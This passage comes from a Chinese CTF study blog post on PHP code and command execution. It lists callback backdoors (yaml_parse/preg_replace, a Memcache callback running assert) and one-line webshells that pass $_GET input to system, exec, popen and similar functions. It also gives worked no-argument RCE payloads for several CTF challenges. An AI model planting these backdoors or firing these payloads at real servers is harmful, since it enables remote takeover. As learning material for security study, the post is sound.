+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">    greeting: !<span class="subst">&#123;$str&#125;</span> &quot;|.+|e&quot;</span></span><br><span class="line"><span class="string">    EOD</span>;</span><br><span class="line">    <span class="variable">$parsed</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_GET[&#x27;south&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="memcache">Memcache</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Memcache</span>::<span class="title function_ invoke__">addServer</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$host</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span> = <span class="number">11211</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$persistent</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$weight</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$timeout</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$retry_interval</span> = ?,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$status</span> = ?,</span><br><span class="line">    callback <span class="variable">$failure_callback</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$timeoutms</span> = ?</span><br><span class="line">): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>需要额外的组件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$mem</span> = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="literal">TRUE</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line">    <span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="命令执行">命令执行</h1>
+<h2 id="system">system</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>有回显，有返回值，<strong>$return_var</strong>为状态码，执行成功为<strong>0</strong>，反之为<strong>1</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="exec">exec</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = ?, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>无回显，有返回值，需手动获取，<strong>$output</strong>为执行结果，<strong>$return_var</strong>同上。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="shell_exec">shell_exec</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>无回显，有返回值，需手动获取。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="passthru">passthru</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): ?<span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>有回显，无返回值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
+<h2 id="反引号">反引号</h2>
+<p>无回显，有返回值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$south</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$south</span>`;</span><br></pre></td></tr></table></figure>
+<h2 id="ob_start">ob_start</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p><strong>$output_callback</strong>是在<strong>ob_flush()</strong>，<strong>ob_clean()</strong>时候才被调用的回调函数，若非调用函数则返回<strong>FALSE</strong>。<strong>$chunk_size</strong>为缓冲区大小，超出即刷新，<strong>0</strong>则最后调用，最大<strong>4096</strong>，<strong>$erase</strong>为<strong>FALSE</strong>的时候需要等脚本全部执行完毕才能刷新缓冲区，否则会抛出一个<strong>notice</strong>，并返回<strong>FALSE</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure>
+<h2 id="popen">popen</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p>两个参数，一个是命令<strong>$command</strong>，另外一个是文件的连接模式<strong>$mode</strong>，<strong>r/w</strong>分别代表读写。</p>
+<p>无执行结果回显，返回文件指针。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;r&#x27;</span> );</span><br><span class="line"><span class="comment"># south=ls &gt;&gt; south.txt</span></span><br></pre></td></tr></table></figure>
+<h2 id="proc_open">proc_open</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span>(</span><br><span class="line">    <span class="keyword">mixed</span> <span class="variable">$cmd</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptorspec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">null</span></span><br><span class="line">): resource</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP&gt;= 4.3.0</strong></p>
+</blockquote>
+<p>类似<strong>popen</strong>，就是选项更多了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$array</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="comment"># south=ls &gt;&gt; south.txt</span></span><br></pre></td></tr></table></figure>
+<h2 id="pcntl_exec">pcntl_exec</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="keyword">string</span> <span class="variable">$path</span>, <span class="keyword">array</span> <span class="variable">$args</span> = ?, <span class="keyword">array</span> <span class="variable">$envs</span> = ?): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>PHP&gt;= 4.2.0</strong>，需要额外安装。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=/bin/bash&amp;sea=ls</span></span><br></pre></td></tr></table></figure>
+<h1 id="例题">例题</h1>
+<h2 id="codebreakingphplimit">2018/CodeBreaking/phplimit</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一句的意思就是匹配无参函数，即phpinfo()可以通过，而system('ls')无法通过。</p>
+<p>利用前面提到的无参函数来进行代码执行。</p>
+<p>localeconv()返回的是包含本地数字及货币格式信息的数组，其中第一位的点可以拿来用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(localeconv());</span><br><span class="line">var_dump(reset(localeconv()));</span><br><span class="line">var_dump(scandir(reset(localeconv())));</span><br><span class="line">var_dump(end(scandir(reset(localeconv()))));</span><br><span class="line">var_dump(show_source(end(scandir(reset(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>直接读取文件有一些限制，也会很麻烦，因此可以通过获取额外的外部参数来执行代码。</p>
+<p>比如：</p>
+<p>get_defined_vars() - 返回由所有已定义变量所组成的数组</p>
+<p>session_id() - 可以⽤来获取当前会话ID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+<h2 id="gxyctf禁止套娃">2019/GXYCTF/禁止套娃</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if (isset($_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p><strong>1. 需要传⼊⼀个get参数exp
+如果满⾜条件就可以执⾏exp</strong></p>
+<p><strong>2. preg_match过滤了php伪协议</strong></p>
+<p><strong>3. preg_replace
+的主要功能就是限制我们传输进来的必须时纯⼩写字⺟的函数，⽽且不能</strong></p>
+<p><strong>携带参数。只能匹配通过⽆参数的函数。</strong></p>
+<p><strong>4.
+最后⼀个preg_match正则匹配掉了et/na/info等关键字，很多函数都⽤不了</strong></p>
+<p>**5. eval($_GET['exp']); 典型的⽆参数RCE**</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">highlight_file(session_id(session_start()));</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="长安战疫rce_no_para">2022/长安"战疫"/RCE_No_Para</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    if (!preg_match(&#x27;/session|end|next|header|dir/i&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">        eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>差不多的题，ban了一些函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(%27cat%20flag.php%27);</span><br></pre></td></tr></table></figure>
+<h2 id="仔细ping">2023/仔细ping</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $a))  &#123;</span><br><span class="line">    if (!preg_match(&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;,$a))&#123;</span><br><span class="line">        eval($a);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;May be you should bypass.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;nonono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?a=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+<h1 id="refer">Refer</h1>
+<p><a
+target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">创造tips的秘籍——PHP回调后门</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8%E4%BF%AE%E7%82%BC%E8%AE%A1%E5%88%92/" rel="tag"><i class="fa fa-tag"></i> Web安全修炼计划</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Study-XSS/" rel="prev" title="Web安全XSS修炼计划">
+                  <i class="fa fa-chevron-left"></i> Web安全XSS修炼计划
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-SSTI/" rel="next" title="关于SSTI的学习">
+                  关于SSTI的学习 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
